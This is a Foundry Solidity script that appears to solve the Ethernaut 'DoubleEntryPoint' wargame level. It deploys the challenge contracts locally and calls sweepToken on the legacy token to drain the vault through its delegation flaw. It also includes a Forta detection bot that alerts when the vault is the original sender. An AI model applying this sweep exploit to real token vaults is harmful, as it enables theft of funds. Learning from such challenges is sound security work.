// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/DoubleEntryPoint.sol";

contract DoubleEntryPointHack is Script {
    DoubleEntryPoint target;
    address public eoa = address(1024);

    function setUp() public {
        LegacyToken oldToken = new LegacyToken();
        Forta forta = new Forta();
        CryptoVault vault = new CryptoVault(eoa);
        target = new DoubleEntryPoint(
            address(oldToken),
            address(vault),
            address(forta),
            eoa
        );
        vault.setUnderlying(address(target));
        oldToken.delegateToNewContract(DelegateERC20(address(target)));

        oldToken.mint(address(vault), 100 ether);
    }

    function run() public {
        // MyDetectionBot mybot = new MyDetectionBot(target.cryptoVault());
        // target.forta().setDetectionBot(address(mybot));
        CryptoVault cryptoVault = CryptoVault(target.cryptoVault());
        cryptoVault.sweepToken(IERC20(target.delegatedFrom()));
        console.log(Forta(target.forta()).botRaisedAlerts(address(this)));
    }
}

contract MyDetectionBot is IDetectionBot {
    address public cryptoVaultAddress;

    constructor(address _cryptoVaultAddress) {
        cryptoVaultAddress = _cryptoVaultAddress;
    }

    function handleTransaction(address user, bytes calldata msgData)
        external
        override
    {
        // address origSender;
        // assembly {
        //     /*
        //      * 0x00: 4 bytes, function selector(`handleTransaction()`)
        //      * 0x04: 32 bytes, address `user`
        //      * 0x24: 32 bytes, offset of `msgData` - `0x40`
        //      * 0x44: 32 bytes, length of `msgData` - `0x64`
        //      * 0x64: 4 bytes, function selector(`delegateTransfer(address,uint256,address)`)
        //      * 0x68: 32 bytes, address `to`
        //      * 0x88: 32 bytes, uint256 `value`
        //      * 0xa8: 32 bytes, address `origSender`
        //      * 0xc8: 28 bytes, padding, 0
        //      */
        //     origSender := calldataload(0xa8)
        // }

        // an high level way to achieve it
        (, , address origSender) = abi.decode(
            msgData[4:],
            (address, uint256, address)
        );

        if (origSender == cryptoVaultAddress) {
            Forta(msg.sender).raiseAlert(user);
        }
    }
}
